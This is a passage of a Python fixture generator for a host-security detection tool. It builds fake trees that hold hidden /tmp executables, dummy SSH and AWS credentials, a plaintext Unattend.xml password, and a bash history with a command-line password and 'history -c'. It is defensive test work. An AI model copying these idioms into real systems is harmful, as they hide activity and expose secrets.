    w(t, "var/log/syslog", "Oct 14 09:00:01 host CRON[123]: session opened\n" * 5)
    w(t, "var/log/auth.log", "Oct 14 09:00:01 host sshd[456]: Accepted publickey\n" * 5)
    w(t, "var/log/wtmp", "binary-wtmp-placeholder")
    w(t, "var/log/btmp", "")
    w(t, "var/log/lastlog", "")
    w(t, "var/log/bootstrap.log", "")
    w(t, "var/log/alternatives.log", "")
    w(t, "var/log/alternatives.log.1", "update-alternatives placeholder content\n")
    link(t, "var/log/README", "../../usr/share/doc/systemd/README.logs")

    empty("lnx-stealth-logsink-001/nodata",
          "Deliberately empty: no /var/log exists on this host.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.")


# =========================================================================================
# LNX-STEALTH-HIDDEN-001
# =========================================================================================

def hiddenartifacts() -> None:
    t = "lnx-stealth-hidden-001/positive"
    # Hidden EXECUTABLE in /tmp: HID-C1. Inert placeholder content, not a real payload.
    w(t, "tmp/.session-cache", "#!/bin/sh\necho placeholder\n", mode=0o755)
    # All-dots directory containing an executable: HID-C3 + HID-C4.
    # A literal "..." directory name is normalised away by the Win32 API (trailing dots in
    # a path component are stripped), so it cannot be created by this generator, which runs
    # on Windows. Written under a safe placeholder name and renamed into place by the Go
    # test harness, which runs on Linux and has no such restriction.
    safe = renamed_path(t, "tmp/__DOTDIR__allDots", "tmp/...")
    # Write without the mode= kwarg: MODES is keyed by the FINAL (post-rename) path, since
    # applyModes runs after applyRenames in the Go harness. Using w()'s mode= here would
    # record the mode under the safe pre-rename path instead.
    w(t, safe + "/runner", "#!/bin/sh\necho placeholder\n")
    MODES.setdefault(t, {})["tmp/.../runner"] = 0o755

    t = "lnx-stealth-hidden-001/negative"
    # Reproduces the measured real-host condition: many hidden NON-executable files.
    for i in range(12):
        w(t, "tmp/.%040x-00000000.so" % (0xbeef0000 + i), "placeholder shared object\n")
    w(t, "tmp/.X11-unix/placeholder", "")
    w(t, "var/tmp/.cache-marker", "not executable\n")

    empty("lnx-stealth-hidden-001/nodata",
          "Deliberately empty and unreachable (the no_data case additionally denies '/'\n"
          "in persist checks that need it). Proves INSUFFICIENT_DATA rather than\n"
          "NOT_DETECTED when no staging directory can be examined.")


# =========================================================================================
# LNX-CRED-FILES-001
# =========================================================================================

# Inert placeholder PEM bodies. These are NOT real key material -- there is no
# corresponding public key or certificate anywhere, and the base64-looking body is just
# repeated filler. They exist only to exercise the PEM-header / encrypted-marker parser.
FAKE_PEM_UNENCRYPTED = """\
-----BEGIN OPENSSH PRIVATE KEY-----
ZmlNdHVyZU9ubHlOb3RBUmVhbEtleUZpeHR1cmVPbmx5Tm90QVJlYWxLZXk=
ZmlNdHVyZU9ubHlOb3RBUmVhbEtleUZpeHR1cmVPbmx5Tm90QVJlYWxLZXk=
-----END OPENSSH PRIVATE KEY-----
"""
FAKE_PEM_ENCRYPTED = """\
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,FIXTUREFIXTUREFIXTUREFIXTUREFIXT

ZmlNdHVyZU9ubHlOb3RBUmVhbEtleUZpeHR1cmVPbmx5Tm90QVJlYWxLZXk=
-----END RSA PRIVATE KEY-----
"""


def credfiles() -> None:
    t = "lnx-cred-files-001/positive"
    w(t, "etc/passwd", PASSWD_BASIC)
    # CRF-C1: a recognised secret-bearing field. FAKE value, not a real AWS key.
    w(t, "home/alice/.aws/credentials", """\
[default]
aws_access_key_id = AKIAFIXTUREONLYNOTREAL
aws_secret_access_key = fixture/ONLY+not0a0real0secret0value0000
""", mode=0o600)
    # CRF-C2 + CRF-C3 together (corroborated): unencrypted AND world-readable.
    w(t, "home/alice/.ssh/id_rsa", FAKE_PEM_UNENCRYPTED, mode=0o644)
    # CRF-C4: a command-line credential idiom in history.
    w(t, "home/alice/.bash_history", """\
ls -la
cd /var/www
PGPASSWORD=fixtureNotARealSecret psql -h db.internal -U app -d orders
history -c
""", mode=0o600)

    t = "lnx-cred-files-001/negative"
    w(t, "etc/passwd", PASSWD_BASIC)
    # Properly protected: encrypted and 0600. Must not fire.
    w(t, "home/alice/.ssh/id_rsa", FAKE_PEM_ENCRYPTED, mode=0o600)
    # The extremely common interactive-prompt idiom: no secret is ever typed, so no
    # history-based criterion may match.
    w(t, "home/alice/.bash_history", """\
ls -la
mysql -u root -p
cd /var/log
tail -f syslog
""", mode=0o600)
    # No .aws/credentials, .netrc, .pgpass etc. present at all -- the clean baseline.

    empty("lnx-cred-files-001/nodata",
          "Deliberately empty: no /etc/passwd, so no accounts or home directories can be\n"
          "enumerated. Proves the check returns INSUFFICIENT_DATA rather than asserting no\n"
          "credentials exist anywhere on the host.")


# =========================================================================================
# WIN-CRED-UNSECURED-001
# =========================================================================================

def wincred() -> None:
    # Registry data (Winlogon, PuTTY) comes from the FakeRegistry in cred_win.go. The
    # filesystem half (unattend.xml) is real fixture content.
    t = "win-cred-unsecured-001/positive"
    w(t, "C/Windows/Panther/Unattend.xml", """\
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
  <settings pass="oobeSystem">
    <component name="Microsoft-Windows-Shell-Setup">
      <UserAccounts>
        <AdministratorPassword>
          <Value>FixtureOnlyNotARealSecretBase64==</Value>
          <PlainText>false</PlainText>
        </AdministratorPassword>
      </UserAccounts>
      <AutoLogon>
        <Password>
          <Value>fixtureNotARealSecret</Value>
          <PlainText>true</PlainText>
        </Password>
        <Enabled>true</Enabled>
        <Username>kiosk</Username>
      </AutoLogon>
    </component>
  </settings>
</unattend>
""")

    t = "win-cred-unsecured-001/negative"
    # No unattend/sysprep file present at all -- the common post-setup state.
    w(t, "C/Windows/System32/placeholder.txt", "fixture tree needs at least one file\n")

    empty("win-cred-unsecured-001/nodata",
          "Deliberately empty: no registry supplied (see cred_win.go Cases()) and no\n"
          "unattend file present. Proves INSUFFICIENT_DATA when the registry is absent.")


def main() -> int:
    if os.path.isdir(ROOT):
        shutil.rmtree(ROOT)
    os.makedirs(ROOT, exist_ok=True)

    systemd()
    cron()
    sshkeys()
    runkey()
    auditd()
    shellrc()
    rcscript()
    accounts()
    winservice()
    schtask()
    wincred()
    history()
    logsink()
    hiddenartifacts()
    credfiles()

    # Registry-only checks: the FakeRegistry lives next to the check, so the fixture tree
    # only has to exist. The note records where the data actually comes from, so a reviewer
    # looking at an empty directory is not left guessing.
    for name, where in [
        ("win-persist-regloadpoint-001", "persist_win3.go"),
        ("win-defimp-defender-001", "defimp_win.go"),
        ("win-defimp-firewall-001", "defimp_win.go"),
        ("win-defimp-eventlog-001", "defimp_win.go"),
    ]:
        for case in ("positive", "negative", "nodata"):
            empty("%s/%s" % (name, case),
                  "Registry-only check. The %s case's registry contents are defined by the\n"
                  "FakeRegistry in internal/checks/%s; this tree exists so the filesystem\n"
                  "root is valid. The nodata case supplies no registry at all, so the check\n"
                  "must return INSUFFICIENT_DATA." % (case, where))

    for tree, modes in sorted(MODES.items()):
        path = os.path.join(ROOT, tree, "modes.json")
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            json.dump({k: oct(v) for k, v in sorted(modes.items())},
                      fh, indent=2, sort_keys=True)
            fh.write("\n")

    for tree, links in sorted(LINKS.items()):
        path = os.path.join(ROOT, tree, "links.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            json.dump(dict(sorted(links.items())), fh, indent=2, sort_keys=True)
            fh.write("\n")

    for tree, renames in sorted(RENAMES.items()):
        path = os.path.join(ROOT, tree, "renames.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            json.dump(dict(sorted(renames.items())), fh, indent=2, sort_keys=True)
            fh.write("\n")

    trees = sorted(
        os.path.relpath(os.path.join(dp, d), ROOT).replace(os.sep, "/")
        for dp, dns, _ in os.walk(ROOT) for d in dns
        if d in ("positive", "negative", "nodata")
    )
    files = sum(len(fn) for _, _, fn in os.walk(ROOT))
    print("fixtures written to %s" % ROOT)
    print("  %d trees, %d files" % (len(trees), files))
    for t in trees:
        print("    " + t)
    return 0


if __name__ == "__main__":
    sys.exit(main())
